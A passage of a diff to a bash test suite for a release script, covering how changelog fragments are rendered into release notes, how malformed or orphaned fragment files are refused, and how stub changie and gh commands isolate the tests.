 ln -s INFRA-1-fine.yaml "$rt/packages/link/$u/link.yaml"
+printf 'kind: Added\nbody: yml\n' > "$rt/packages/two/$u/INFRA-1-a.yml"
+printf 'not a fragment\n' > "$rt/packages/two/$u/README.md"
 git -C "$rt" add -A
 git -C "$rt" commit -q -m "feat: odd entries"
-# refuse_run <spec>...: runs fold-plan in that repository; leaves rc, out and err.
+refuse_notes="$work/fold-refuse.md"
+# A changie that fails if it is ever run, first on PATH for the refusals below: neither command
+# reaches changie to make them, and fold-check looks for one before it reads anything, so the
+# cases say the same thing whether or not the real changie is installed.
+mkdir -p "$work/stub-bin"
+cat > "$work/stub-bin/changie" <<'STUB'
+#!/usr/bin/env bash
+echo "the stub changie was run" >&2
+exit 1
+STUB
+chmod +x "$work/stub-bin/changie"
+# refuse_run <command> <arg>...: runs that command of the script under test in the refusal
+# repository, with the stub changie on PATH; leaves rc, out and err.
 refuse_run() {
+  rm -f "$refuse_notes"
   set +e
-  out=$(cd "$rt" && "$release_push" fold-plan "$@" 2>"$work/fold-refuse.err")
+  out=$(cd "$rt" && PATH="$work/stub-bin:$PATH" "$release_push" "$@" 2>"$work/fold-refuse.err")
   rc=$?
   set -e
   err=$(<"$work/fold-refuse.err")
 }
 refused='at HEAD: each entry in a package.s \.changes/unreleased/ must be a regular file whose name ends in \.yaml'
 for entry in sub/sjawhar yml/INFRA-1-a.yml readme/README.md link/link.yaml; do
-  refuse_run "packages/${entry%%/*}"
-  check "fold-plan: packages/${entry%%/*}/$u/${entry#*/} is refused by name, with no plan" \
-    "$(is "$rc|$out|$(contains "$err" "^::error::release-push\.sh fold-plan: packages/${entry%%/*}/$u/${entry#*/} $refused")" "1||true")"
+  refuse_run fold-notes 1.0.0 "$refuse_notes" "packages/${entry%%/*}" odd-v
+  check "fold-notes: packages/${entry%%/*}/$u/${entry#*/} is refused by name, writing no file" \
+    "$(is "$rc|$([ -e "$refuse_notes" ] && echo true || echo false)|$(contains "$err" "^::error::release-push\.sh fold-notes: packages/${entry%%/*}/$u/${entry#*/} $refused")" "1|false|true")"
+  refuse_run fold-check "packages/${entry%%/*}"
+  check "fold-check: packages/${entry%%/*}/$u/${entry#*/} is refused the same way" \
+    "$(is "$rc|$(contains "$err" "^::error::release-push\.sh fold-check: packages/${entry%%/*}/$u/${entry#*/} $refused")" "1|true")"
 done
-refuse_run packages/sub packages/yml packages/readme packages/link
-check "fold-plan: one error names every refused entry of every spec, sorted, with no plan" \
-  "$(is "$rc|$out|$(grep -c '^::error::' <<<"$err")|$(contains "$err" "^::error::release-push\.sh fold-plan: packages/link/$u/link\.yaml packages/readme/$u/README\.md packages/sub/$u/sjawhar packages/yml/$u/INFRA-1-a\.yml $refused")" "1||1|true")"
+refuse_run fold-notes 1.0.0 "$refuse_notes" packages/two odd-v
+check "fold-notes: one error names every refused entry of the package, sorted" \
+  "$(is "$rc|$(grep -c '^::error::' <<<"$err")|$(contains "$err" "^::error::release-push\.sh fold-notes: packages/two/$u/INFRA-1-a\.yml packages/two/$u/README\.md $refused")" "1|1|true")"
+check "fold-notes: that refusal says to move or rename a fragment in one commit with git mv" \
+  "$(contains "$err" 'in one commit, with git mv')"
+refuse_run fold-check
+check "fold-check: no package directory is refused" \
+  "$(is "$rc|$out|$(contains "$err" '^::error::release-push\.sh fold-check: no package directory given')" "1||true")"
 
-# A file under the .changes/ of a package no spec names does not stop the fold: fold-plan names it
-# in one ::warning::, prints the plan all the same and exits 0, since the fold runs on main, where
-# a refusal would fold no package at all. fold-orphans is that check made strict, for ci.yaml's
-# lint job, which runs it on every pull request and refuses the file before it reaches main.
-# packages/envoy is folded, under envoy-v; packages/daemon, which has no CHANGELOG.md and no
-# .changie.yaml, is not.
+# fold-check without changie: one refusal naming the tool, where rendering each fragment to find
+# the refusals would report every one of them refused with `changie: command not found` inside
+# the message. The command refuses before it runs anything, so an empty PATH costs it nothing;
+# $BASH runs the script, which its `/usr/bin/env bash` could not find there.
+mkdir -p "$work/no-tools"
+set +e
+out=$(cd "$rt" && env PATH="$work/no-tools" "$BASH" "$release_push" fold-check packages/sub 2>&1)
+rc=$?
+set -e
+check "fold-check: with no changie on PATH it refuses once, naming the tool and how to install it" \
+  "$(is "$rc|$(grep -c '^::error::' <<<"$out")|$(contains "$out" '^::error::release-push\.sh fold-check: changie is not on PATH,.*install-changie')" "1|1|true")"
+check "fold-check: that refusal names no fragment" "$(is "$(contains "$out" 'INFRA-1-fine')" false)"
+
+# The rendering cases need the real changie, which the release build jobs install with
+# .github/actions/install-changie. Without it on PATH they are skipped, not counted.
+echo
+echo "Case: fold-notes renders the changelog entries a release's own commits added"
+if command -v changie >/dev/null; then
+  notes_run "$c1" 1.9.0 packages/rel rel-v
+  check "fold-notes: the first release of a line, with no tag below it, renders the entries it ships" \
+    "$(is "$rc|$out|$(contains "$err" "^Wrote $notes_file from 2 fragments\$")" "0|notes=true|true")"
+  check "fold-notes: those notes hold that release's entries under their kind, and no later release's" \
+    "$(is "$(contains "$notes" '^### Added$')|$(contains "$notes" '^- the first entry$')|$(contains "$notes" '^- another entry$')|$(contains "$notes" 'the second entry')" "true|true|true|false")"
+  notes_run "$c2" 1.10.0 packages/rel rel-v
+  check "fold-notes: the next release holds its own entry alone, the bump-shaped tag below it bounding the rest" \
+    "$(is "$rc|$out|$(contains "$err" "from 1 fragments\$")|$(contains "$notes" '^- the second entry$')|$(contains "$notes" 'the first entry')" "0|notes=true|true|true|false")"
+  notes_run "$c3" 1.11.0 packages/rel rel-v
+  check "fold-notes: a release with no tag of its own yet holds the entries added since the newest release" \
+    "$(is "$rc|$(contains "$notes" '^- the third entry$')|$(contains "$notes" 'the second entry')" "0|true|false")"
+  check "fold-notes: rel-v1.11.0-rc.1, a name under the prefix that is no release, bounded nothing" \
+    "$(is "$(contains "$notes" '^- the third entry$')" true)"
+  notes_run "$c1" 1.10.0 packages/rel rel-v
+  check "fold-notes: a release whose commits a lower tag already holds writes no file, prints notes=false and exits 0" \
+    "$(is "$rc|$wrote|$out|$(contains "$err" '^No changelog fragment of packages/rel is new in 1\.10\.0; wrote no notes file$')" "0|false|notes=false|true")"
+  notes_run "$c3" 1.11.0 packages/empty rel-v
+  check "fold-notes: a package holding no fragment at all writes no file, prints notes=false and exits 0" \
+    "$(is "$rc|$wrote|$out|$(contains "$err" '^No changelog fragment of packages/empty is new in 1\.11\.0; wrote no notes file$')" "0|false|notes=false|true")"
+  # Only HEAD's tree counts: a file the working tree alone holds is in no release.
+  printf 'kind: Added\nbody: untracked\n' > "$ft/a/packages/rel/$u/INFRA-9-untracked.yaml"
+  notes_run "$c3" 1.11.0 packages/rel rel-v
+  rm -f "$ft/a/packages/rel/$u/INFRA-9-untracked.yaml"
+  check "fold-notes: a fragment the working tree alone holds is rendered nowhere" \
+    "$(is "$rc|$(contains "$notes" 'untracked')" "0|false")"
+
+  # A fragment name holding a glob character is still one file: the commit that added that very
+  # file decides which release ships it, never one that added another file the name matches as a
+  # pattern. Here INFRA-7-[a].yaml ships in glob-v1.0.0, and INFRA-7-a.yaml, which `[a]` matches
+  # as a glob, is added after it and ships in glob-v1.1.0.
+  gt="$work/fold-glob"
+  mkdir -p "$gt/packages/glob/$u"
+  git init -q -b main "$gt"
+  identity "$gt"
+  changie_config "$gt/packages/glob"
+  printf 'kind: Added\nbody: bracketed\n' > "$gt/packages/glob/$u/INFRA-7-[a].yaml"
+  git -C "$gt" add -A
+  GIT_COMMITTER_DATE=2026-05-01T12:00:00+00:00 git -C "$gt" commit -q -m "feat: bracketed"
+  git -C "$gt" tag glob-v1.0.0
+  printf 'kind: Added\nbody: plain\n' > "$gt/packages/glob/$u/INFRA-7-a.yaml"
+  git -C "$gt" add -A
+  GIT_COMMITTER_DATE=2026-05-02T12:00:00+00:00 git -C "$gt" commit -q -m "feat: plain"
+  git -C "$gt" tag glob-v1.1.0
+  set +e
+  out=$(cd "$gt" && "$release_push" fold-notes 1.1.0 "$work/fold-glob.md" packages/glob glob-v 2>&1)
+  rc=$?
+  set -e
+  glob_notes=$(<"$work/fold-glob.md")
+  check "fold-notes: a fragment whose name holds a glob character ships in the release of the commit that added that very file" \
+    "$(is "$rc|$(contains "$glob_notes" '^- plain$')|$(contains "$glob_notes" 'bracketed')" "0|true|false")"
+
+  # A fragment renamed with git mv keeps the release that first shipped it. Here sjawhar/fix.yaml
+  # ships in ren-v1.0.0; a later commit moves it to sjawhar-fix.yaml, and INFRA-8-later.yaml,
+  # alike enough to read to git as a copy of it, is added after that and ships in ren-v1.1.0
+  # (`git log --follow` would follow that copy and give it the older release).
+  nt="$work/fold-rename"
+  mkdir -p "$nt/packages/ren/$u/sjawhar"
+  git init -q -b main "$nt"
+  identity "$nt"
+  changie_config "$nt/packages/ren"
+  printf 'kind: Fixed\ntime: 2026-06-01T12:00:00Z\nbody: a nested fix\n' > "$nt/packages/ren/$u/sjawhar/fix.yaml"
+  git -C "$nt" add -A
+  GIT_COMMITTER_DATE=2026-06-01T12:00:00+00:00 git -C "$nt" commit -q -m "fix: nested"
+  git -C "$nt" tag ren-v1.0.0
+  git -C "$nt" mv "packages/ren/$u/sjawhar/fix.yaml" "packages/ren/$u/sjawhar-fix.yaml"
+  GIT_COMMITTER_DATE=2026-06-02T12:00:00+00:00 git -C "$nt" commit -q -m "chore: move the fragment"
+  printf 'kind: Fixed\ntime: 2026-06-03T12:00:00Z\nbody: a later fix\n' > "$nt/packages/ren/$u/INFRA-8-later.yaml"
+  git -C "$nt" add -A
+  GIT_COMMITTER_DATE=2026-06-03T12:00:00+00:00 git -C "$nt" commit -q -m "fix: later"
+  git -C "$nt" tag ren-v1.1.0
+  set +e
+  out=$(cd "$nt" && "$release_push" fold-notes 1.1.0 "$work/fold-rename.md" packages/ren ren-v 2>&1)
+  rc=$?
+  set -e
+  ren_notes=$(<"$work/fold-rename.md")
+  check "fold-notes: a fragment renamed with git mv keeps the release that first shipped it, and one alike enough to read as its copy gets its own" \
+    "$(is "$rc|$(contains "$ren_notes" '^- a later fix$')|$(contains "$ren_notes" 'a nested fix')" "0|true|false")"
+
+  echo
+  echo "Case: fold-notes renders a package with the shipped packages/pi-legion/.changie.yaml"
+  # The configurations above are this file's own, minimal ones; this one is the shipped file
+  # itself, copied in beside fragments carrying the custom Issue field it requires, so a bad edit
+  # to a real .changie.yaml fails here rather than in a release's build job. ci.yaml's test filter
+  # and .github/scripts/ci_job_reads.py name that file for this copy.
+  sc="$work/fold-shipped-config"
+  mkdir -p "$sc/packages/shipped/$u"
+  git init -q -b main "$sc"
+  identity "$sc"
+  cp "$script_dir/../../packages/pi-legion/.changie.yaml" "$sc/packages/shipped/.changie.yaml"
+  cat > "$sc/packages/shipped/$u/INFRA-20-Added-20260101-120000.yaml" <<'YAML'
+kind: Added
+body: a plain addition
+time: 2026-01-01T12:00:00Z
+custom:
+  Issue: INFRA-20
+YAML
+  cat > "$sc/packages/shipped/$u/INFRA-21-Changed-20260101-130000.yaml" <<'YAML'
+kind: Changed
+body: |-
+  a change whose entry runs
+  onto a second line
+
+  and a second paragraph
+time: 2026-01-01T13:00:00Z
+custom:
+  Issue: INFRA-21
+YAML
+  git -C "$sc" add -A
+  GIT_COMMITTER_DATE=2026-01-02T12:00:00+00:00 git -C "$sc" commit -q -m "feat: two entries"
+  git -C "$sc" tag shipped-v3.1.0
+  shipped_notes="$work/notes-shipped.md"
+  set +e
+  out=$(cd "$sc" && "$release_push" fold-notes 3.1.0 "$shipped_notes" packages/shipped shipped-v 2>&1)
+  rc=$?
+  set -e
+  check "the shipped config: fold-notes exits 0, writing the release's notes file" \
+    "$(is "$rc|$([ -f "$shipped_notes" ] && echo true || echo false)" "0|true")"
+  # What that config's kindFormat, changeFormat and newlines render, byte for byte: a heading per
+  # kind in the config's order, one bullet per entry, and the second and later lines of a body two
+  # spaces under the bullet, with its blank line left empty.
+  printf '\n\n### Added\n\n- a plain addition\n\n### Changed\n\n- a change whose entry runs\n  onto a second line\n\n  and a second paragraph' \
+    > "$work/shipped-expected.md"
+  check "the shipped config: the entries render under their kind, each body line after the first two spaces under the bullet" \
+    "$(cmp -s "$work/shipped-expected.md" "$shipped_notes" && echo true || echo false)"
+
+  echo
+  echo "Case: fold-check renders every fragment of a pull request's checkout and names what changie refuses"
+  # The pull request's gate, over the same repository and the same shipped configuration: after
+  # the merge nothing renders a fragment before the release that first ships it, so a fragment
+  # changie refuses would fail that release's build job on every run until a fix merges.
+  # check_run <package-dir>...: runs fold-check in that repository; leaves rc and out (combined).
+  check_run() {
+    set +e
+    out=$(cd "$sc" && "$release_push" fold-check "$@" 2>&1)
+    rc=$?
+    set -e
+  }
+  check_run packages/shipped
+  check "fold-check: a checkout whose every fragment renders exits 0, saying nothing" "$(is "$rc|$out" "0|")"
+  check_run packages/shipped packages/none
+  check "fold-check: a package holding no fragment renders nothing and exits 0" "$(is "$rc|$out" "0|")"
+  check_run packages/shipped=shipped-v
+  check "fold-check: a tag prefix on the directory is refused: fold-check reads no release line" \
+    "$(is "$rc|$(contains "$out" '^::error::release-push\.sh fold-check: package directory packages/shipped=shipped-v is not a relative path')" "1|true")"
+  bad="$sc/packages/shipped/$u/INFRA-22-Fixd-20260101-140000.yaml"
+  cat > "$bad" <<'YAML'
+kind: Fixd
+body: a kind the configuration does not list
+time: 2026-01-01T14:00:00Z
+custom:
+  Issue: INFRA-22
+YAML
+  git -C "$sc" add -A
+  GIT_COMMITTER_DATE=2026-01-03T12:00:00+00:00 git -C "$sc" commit -q -m "feat: a kind changie refuses"
+  check_run packages/shipped
+  check "fold-check: a kind the configuration does not list fails it, with one ::error:: naming that fragment and what changie said" \
+    "$(is "$rc|$(grep -c '^::error::' <<<"$out")|$(contains "$out" "packages/shipped/$u/INFRA-22-Fixd-20260101-140000\.yaml, where changie said: .*Fixd")" "1|1|true")"
+  check "fold-check: the error names no fragment changie renders" \
+    "$(is "$(contains "$out" 'INFRA-20')|$(contains "$out" 'INFRA-21')" "false|false")"
+  cat > "$sc/packages/shipped/$u/INFRA-23-Chnged-20260101-150000.yaml" <<'YAML'
+kind: Chnged
+body: another kind the configuration does not list
+time: 2026-01-01T15:00:00Z
+custom:
+  Issue: INFRA-23
+YAML
+  git -C "$sc" add -A
+  GIT_COMMITTER_DATE=2026-01-04T12:00:00+00:00 git -C "$sc" commit -q -m "feat: a second kind changie refuses"
+  check_run packages/shipped
+  check "fold-check: both refused fragments are named, each with what changie said, in the one error" \
+    "$(is "$rc|$(grep -c '^::error::' <<<"$out")|$(contains "$out" "INFRA-22-Fixd-20260101-140000\.yaml, where changie said: .*Fixd")|$(contains "$out" "INFRA-23-Chnged-20260101-150000\.yaml, where changie said: .*Chnged")" "1|1|true|true")"
+  # What fold-check is there to stop: the release that first ships such a fragment fails its own
+  # build job, naming it the same way, on every run until a fix merges.
+  set +e
+  out=$(cd "$sc" && "$release_push" fold-notes 3.2.0 "$work/notes-refused.md" packages/shipped shipped-v 2>&1)
+  rc=$?
+  set -e
+  check "fold-notes: the release that first ships a fragment changie refuses fails, naming each one" \
+    "$(is "$rc|$(contains "$out" "^::error::release-push\.sh fold-notes: changie could not render packages/shipped's notes for 3\.2\.0; refused alone: .*INFRA-22-Fixd.*INFRA-23-Chnged.*; changie said: ")" "1|true")"
+else
+  echo "  SKIP: the cases that render with changie (changie is not on PATH)"
+fi
+
+echo
+echo "Case: fold-orphans refuses a fragment of a package it was not given"
+# ci.yaml's lint job runs it over .github/changelog-packages on every pull request, inside a
+# required check, so a fragment no release renders is caught before it reaches main.
+# packages/envoy is released under envoy-v; packages/daemon, which has no .changie.yaml, is not.
 ot="$work/fold-orphan"
 git init -q -b main "$ot"
 identity "$ot"
 mkdir -p "$ot/packages/envoy/$u" "$ot/packages/daemon/$u"
-printf '# Changelog\n' > "$ot/packages/envoy/CHANGELOG.md"
 printf 'kind: Added\nbody: an envoy entry\n' > "$ot/packages/envoy/$u/pr-1-envoy.yaml"
 printf 'kind: Added\nbody: a daemon entry\n' > "$ot/packages/daemon/$u/pr-1-daemon.yaml"
 git -C "$ot" add -A
 GIT_COMMITTER_DATE=2026-07-01T12:00:00+00:00 git -C "$ot" commit -q -m "feat: two fragments"
 git -C "$ot" tag envoy-v1.0.0
-envoy_plan="packages/envoy	1.0.0	2026-07-01	packages/envoy/$u/pr-1-envoy.yaml"
-# orphan_run: runs fold-plan over packages/envoy alone in that repository; leaves rc, out and err.
-orphan_run() {
-  set +e
-  out=$(cd "$ot" && "$release_push" fold-plan packages/envoy=envoy-v 2>"$work/fold-orphan.err")
-  rc=$?
-  set -e
-  err=$(<"$work/fold-orphan.err")
-}
-orphan_run
-check "fold-plan: a fragment of a package no spec names is one ::warning::, not an ::error::" \
-  "$(is "$rc|$out|$(grep -c "^::warning::release-push\.sh fold-plan: packages/daemon/$u/pr-1-daemon\.yaml at HEAD: " <<<"$err")|$(grep -c '^::error::' <<<"$err")" "0|$envoy_plan|1|0")"
-check "fold-plan: that warning names the specs it was given and says what to do about the file" \
-  "$(is "$(contains "$err" 'here packages/envoy=envoy-v,')|$(contains "$err" 'remove it, or give its package a \.changie\.yaml and a CHANGELOG\.md and add it to \.github/changelog-packages$')" "true|true")"
-# changelog-fold.yaml's build job runs fold-plan over .github/changelog-packages on main and fails
-# its step when fold-plan exits non-zero, so a refusal there folds no package at all. An orphan fragment
-# that reaches main must not stop the fold of the packages the fold is given: the plan still lists
-# packages/envoy's fragment, and the orphan is named on stderr for someone to remove.
-check "fold-plan: an orphan fragment on main does not stop the plan of the packages the fold is given" \
-  "$(is "$rc|$out|$(contains "$err" "packages/daemon/$u/pr-1-daemon\.yaml")" "0|$envoy_plan|true")"
-# orphans_run <spec>...: runs fold-orphans in that repository; leaves rc, out and err.
+# orphans_run <package-dir>...: runs fold-orphans in that repository; leaves rc, out and err.
 orphans_run() {
   set +e
   out=$(cd "$ot" && "$release_push" fold-orphans "$@" 2>"$work/fold-orphans.err")
@@ -2637,375 +2042,31 @@ orphans_run() {
   set -e
   err=$(<"$work/fold-orphans.err")
 }
-orphans_run packages/envoy=envoy-v
-check "fold-orphans: the same file is refused, with one error naming it and nothing on stdout" \
+orphans_run packages/envoy
+check "fold-orphans: the daemon's fragment is refused, with one error naming it and nothing on stdout" \
   "$(is "$rc|$out|$(grep -c "^::error::release-push\.sh fold-orphans: packages/daemon/$u/pr-1-daemon\.yaml at HEAD: " <<<"$err")" "1||1")"
-check "fold-orphans: that refusal names the specs it was given and says what to do about the file" \
-  "$(is "$(contains "$err" 'here packages/envoy=envoy-v,')|$(contains "$err" 'remove it, or give its package a \.changie\.yaml and a CHANGELOG\.md and add it to \.github/changelog-packages$')" "true|true")"
+check "fold-orphans: that refusal names the directories it was given and says what to do about the file" \
+  "$(is "$(contains "$err" 'here packages/envoy,')|$(contains "$err" 'remove it, or give its package a \.changie\.yaml and a CHANGELOG\.md and add it to \.github/changelog-packages$')" "true|true")"
 git -C "$ot" rm -q "packages/daemon/$u/pr-1-daemon.yaml"
 GIT_COMMITTER_DATE=2026-07-02T12:00:00+00:00 git -C "$ot" commit -q -m "chore: remove the daemon fragment"
-orphan_run
-check "fold-plan: with the file removed in a commit, the plan is printed and nothing is said" \
-  "$(is "$rc|$err|$out" "0||$envoy_plan")"
-orphans_run packages/envoy=envoy-v
+orphans_run packages/envoy
 check "fold-orphans: with the file removed in a commit, it exits 0 saying nothing" "$(is "$rc|$out|$err" "0||")"
-# Only HEAD's tree counts: a file the working tree alone holds is no fragment of the fold.
+# Only HEAD's tree counts: a file the working tree alone holds is no fragment of this repository.
 mkdir -p "$ot/packages/daemon/$u"
 printf 'kind: Added\nbody: uncommitted\n' > "$ot/packages/daemon/$u/pr-2-daemon.yaml"
-orphan_run
-check "fold-plan: a file under .changes/ in the working tree alone is not refused" \
-  "$(is "$rc|$err|$out" "0||$envoy_plan")"
-orphans_run packages/envoy=envoy-v
+orphans_run packages/envoy
 check "fold-orphans: a file under .changes/ in the working tree alone is not refused" "$(is "$rc|$out|$err" "0||")"
 rm -r "$ot/packages/daemon/.changes"
-# Anywhere under .changes/, not only in unreleased/: the fold reads nothing of that package.
+# Anywhere under .changes/, not only in unreleased/: no release reads anything of that package.
 mkdir -p "$ot/packages/daemon/.changes"
 printf 'A header\n' > "$ot/packages/daemon/.changes/header.tpl.md"
 git -C "$ot" add -A
 GIT_COMMITTER_DATE=2026-07-03T12:00:00+00:00 git -C "$ot" commit -q -m "chore: a daemon .changes file"
-orphan_run
-check "fold-plan: a file under .changes/ outside unreleased/ is warned about too, with the plan printed" \
-  "$(is "$rc|$out|$(contains "$err" "^::warning::release-push\.sh fold-plan: packages/daemon/\.changes/header\.tpl\.md at HEAD: ")" "0|$envoy_plan|true")"
-orphans_run packages/envoy=envoy-v
-check "fold-orphans: a file under .changes/ outside unreleased/ is refused too, printing no plan" \
+orphans_run packages/envoy
+check "fold-orphans: a file under .changes/ outside unreleased/ is refused too" \
   "$(is "$rc|$out|$(contains "$err" "^::error::release-push\.sh fold-orphans: packages/daemon/\.changes/header\.tpl\.md at HEAD: ")" "1||true")"
 orphans_run
-check "fold-orphans: no spec is refused" \
-  "$(is "$rc|$out|$(contains "$err" '^::error::release-push\.sh fold-orphans: no package spec given')" "1||true")"
+check "fold-orphans: no package directory is refused" \
+  "$(is "$rc|$out|$(contains "$err" '^::error::release-push\.sh fold-orphans: no package directory given')" "1||true")"
 
-# A fragment name holding a glob character is still one file: fold-plan finds the commit that
-# added that file, never one that added another file the name matches as a pattern. Here
-# INFRA-7-[a].yaml ships in glob-v1.0.0, and INFRA-7-a.yaml, which `[a]` matches as a glob, is
-# added after it and ships in glob-v1.1.0.
-gt="$work/fold-glob"
-mkdir -p "$gt/packages/glob/.changes/unreleased"
-git init -q -b main "$gt"
-identity "$gt"
-printf '# Changelog\n' > "$gt/packages/glob/CHANGELOG.md"
-printf 'kind: Added\nbody: bracketed\n' > "$gt/packages/glob/.changes/unreleased/INFRA-7-[a].yaml"
-git -C "$gt" add -A
-GIT_COMMITTER_DATE=2026-05-01T12:00:00+00:00 git -C "$gt" commit -q -m "feat: bracketed"
-git -C "$gt" tag glob-v1.0.0
-printf 'kind: Added\nbody: plain\n' > "$gt/packages/glob/.changes/unreleased/INFRA-7-a.yaml"
-git -C "$gt" add -A
-GIT_COMMITTER_DATE=2026-05-02T12:00:00+00:00 git -C "$gt" commit -q -m "feat: plain"
-git -C "$gt" tag glob-v1.1.0
-set +e
-out=$(cd "$gt" && "$release_push" fold-plan packages/glob=glob-v 2>/dev/null)
-rc=$?
-set -e
-check "fold-plan: a fragment whose name holds a glob character gets the release of the commit that added that very file" \
-  "$(is "$rc|$out" "0|packages/glob	1.0.0	2026-05-01	packages/glob/$u/INFRA-7-[a].yaml
-packages/glob	1.1.0	2026-05-02	packages/glob/$u/INFRA-7-a.yaml")"
-
-# A fragment renamed with git mv keeps the release of the commit that first added it. Here
-# sjawhar/fix.yaml, in a subdirectory fold-plan refuses, ships in ren-v1.0.0; a later commit moves
-# it to sjawhar-fix.yaml, and INFRA-8-later.yaml, alike enough to read to git as a copy of it, is
-# added after that and ships in ren-v1.1.0 (`git log --follow` would follow that copy).
-nt="$work/fold-rename"
-mkdir -p "$nt/packages/ren/$u/sjawhar"
-git init -q -b main "$nt"
-identity "$nt"
-printf '# Changelog\n' > "$nt/packages/ren/CHANGELOG.md"
-printf 'component: ren\nkind: Fixed\nbody: a nested fix\n' > "$nt/packages/ren/$u/sjawhar/fix.yaml"
-git -C "$nt" add -A
-GIT_COMMITTER_DATE=2026-06-01T12:00:00+00:00 git -C "$nt" commit -q -m "fix: nested"
-git -C "$nt" tag ren-v1.0.0
-set +e
-out=$(cd "$nt" && "$release_push" fold-plan packages/ren=ren-v 2>"$work/fold-rename.err")
-rc=$?
-set -e
-err=$(<"$work/fold-rename.err")
-check "fold-plan: the refusal of a misplaced entry says to move or rename a fragment in one commit with git mv" \
-  "$(is "$rc|$out|$(contains "$err" "^::error::release-push\.sh fold-plan: packages/ren/$u/sjawhar $refused.* in one commit, with git mv")" "1||true")"
-git -C "$nt" mv "packages/ren/$u/sjawhar/fix.yaml" "packages/ren/$u/sjawhar-fix.yaml"
-GIT_COMMITTER_DATE=2026-06-02T12:00:00+00:00 git -C "$nt" commit -q -m "chore: move the fragment"
-printf 'component: ren\nkind: Fixed\nbody: a later fix\n' > "$nt/packages/ren/$u/INFRA-8-later.yaml"
-git -C "$nt" add -A
-GIT_COMMITTER_DATE=2026-06-03T12:00:00+00:00 git -C "$nt" commit -q -m "fix: later"
-git -C "$nt" tag ren-v1.1.0
-set +e
-out=$(cd "$nt" && "$release_push" fold-plan packages/ren=ren-v 2>/dev/null)
-rc=$?
-set -e
-check "fold-plan: a fragment renamed with git mv gets the release of the commit that first added it, and one alike enough to read as its copy its own" \
-  "$(is "$rc|$out" "0|packages/ren	1.0.0	2026-06-01	packages/ren/$u/sjawhar-fix.yaml
-packages/ren	1.1.0	2026-06-03	packages/ren/$u/INFRA-8-later.yaml")"
-
-# The stub gh, first on PATH in a directory of its own. It logs each call to $GH_TEST_DIR/calls as
-# one line, each argument in brackets; `gh workflow run` fails when $GH_TEST_FAIL is set, and any
-# other call fails as unexpected.
-mkdir -p "$work/fold-bin"
-cat > "$work/fold-bin/gh" <<'GH'
-#!/usr/bin/env bash
-{ printf '[%s]' "$@"; printf '\n'; } >> "$GH_TEST_DIR/calls"
-[ "$1 $2" = "workflow run" ] || { echo "unexpected gh call: $*" >&2; exit 3; }
-[ -z "$GH_TEST_FAIL" ] || { echo "HTTP 403: Resource not accessible by integration" >&2; exit 1; }
-GH
-chmod +x "$work/fold-bin/gh"
-fold_specs=(packages/rel=rel-v packages/side packages/plain packages/empty)
-# fold_case <name>: a copy of the template at $work/<name> ($fc), with the notes of the plan of
-# fold_specs in $fc/notes, as a build job hands them (blank lines around them are trimmed).
-fold_case() {
-  fc="$work/$1"
-  fold_base=$base fold_tip=$base
-  cp -a "$ft" "$fc"
-  mkdir "$fc/notes"
-  printf '\n\n### Added\n\n- the first entry\n- another entry\n\n\n' > "$fc/notes/rel_1.9.0.md"
-  printf '### Fixed\n\n- the second entry\n  continued\n' > "$fc/notes/rel_1.10.0.md"
-  printf '### Changed\n\n- side entries\n' > "$fc/notes/side_$main_label.md"
-  printf '### Added\n\n- a plain entry\n' > "$fc/notes/plain_$main_label.md"
-}
-# push_fold [VAR=value...]: runs `release-push.sh push-fold $fold_base $fc/notes <fold_specs>` in
-# the case's clone with the deploy key, a fresh TMPDIR, the GitHub URL rewritten to the case's
-# origin and the stub gh; leaves rc, out (combined), calls (the stub's log) and left (what TMPDIR
-# holds afterwards).
-push_fold() {
-  rm -rf "$fc/tmp" && mkdir "$fc/tmp"
-  : > "$fc/calls"
-  set +e
-  out=$(cd "$fc/a" && env TMPDIR="$fc/tmp" GITHUB_REPOSITORY=example/repo DEPLOY_KEY="$(<"$work/deploy")" \
-    GH_TEST_DIR="$fc" GH_TEST_FAIL='' PATH="$work/fold-bin:$PATH" GIT_CONFIG_COUNT=1 \
-    GIT_CONFIG_KEY_0="url.$fc/origin.git.insteadOf" GIT_CONFIG_VALUE_0="git@github.com:example/repo.git" \
-    "$@" "$release_push" push-fold "$fold_base" "$fc/notes" "${fold_specs[@]}" 2>&1)
-  rc=$?
-  set -e
-  calls=$(<"$fc/calls")
-  left=$(find "$fc/tmp" -mindepth 1 | wc -l)
-}
-# untouched [<status>]: true when the case's clone is still at its checkout ($fold_tip) with the
-# working-tree status <status> (none by default), origin's main is still there and gh was not
-# called.
-untouched() {
-  [ "$(git -C "$fc/a" rev-parse HEAD)" = "$fold_tip" ] &&
-    [ "$(git -C "$fc/a" status --porcelain --untracked-files=no)" = "${1:-}" ] &&
-    [ "$(git -C "$fc/origin.git" rev-parse main)" = "$fold_tip" ] && [ -z "$calls" ] && echo true || echo false
-}
-# kept <old> <new>: true when every line of <old> is in <new>, in order (a diff deletes none).
-kept() { is "$(contains "$(diff <(printf '%s\n' "$1") <(printf '%s\n' "$2") || true)" '^<')" false; }
-
-fold_case fold-accepted
-push_fold
-check "push-fold: exits 0, leaving nothing in TMPDIR" "$(is "$rc|$left" "0|0")"
-check "push-fold: says what it folded, and gives no notice" \
-  "$(is "$(contains "$out" '^Folded 6 fragments into packages/rel/CHANGELOG.md packages/side/CHANGELOG.md packages/plain/CHANGELOG.md$')|$(contains "$out" '::notice')" "true|false")"
-check "push-fold: calls no gh" "$(is "$calls" "")"
-o="$fc/origin.git"
-check "push-fold: origin's main is one commit over the base" \
-  "$(is "$(git -C "$o" rev-list --count "$base..main")|$(git -C "$o" log -1 --format=%P main)" "1|$base")"
-check "push-fold: the commit's message is the fixed subject alone" \
-  "$(is "$(git -C "$o" cat-file commit main | sed '1,/^$/d' | od -c)" "$(printf 'chore: fold changelog fragments [skip ci]\n' | od -c)")"
-check "push-fold: the commit's author and committer are github-actions[bot]" \
-  "$(is "$(git -C "$o" log -1 --format='%an <%ae>|%cn <%ce>' main)" \
-    "github-actions[bot] <41898282+github-actions[bot]@users.noreply.github.com>|github-actions[bot] <41898282+github-actions[bot]@users.noreply.github.com>")"
-check "push-fold: the planned fragments are gone, the changelogs changed, and nothing else" \
-  "$(is "$(git -C "$o" diff --name-status "$base" main)" "D	packages/plain/$u/INFRA-3-plain.yaml
-M	packages/plain/CHANGELOG.md
-D	packages/rel/$u/INFRA-1-another.yaml
-D	packages/rel/$u/INFRA-1-first.yaml
-D	packages/rel/$u/INFRA-2-second.yaml
-M	packages/rel/CHANGELOG.md
-D	packages/side/$u/INFRA-1-side.yaml
-D	packages/side/$u/INFRA-3-side.yaml
-M	packages/side/CHANGELOG.md")"
-new_rel=$(git -C "$o" show main:packages/rel/CHANGELOG.md)
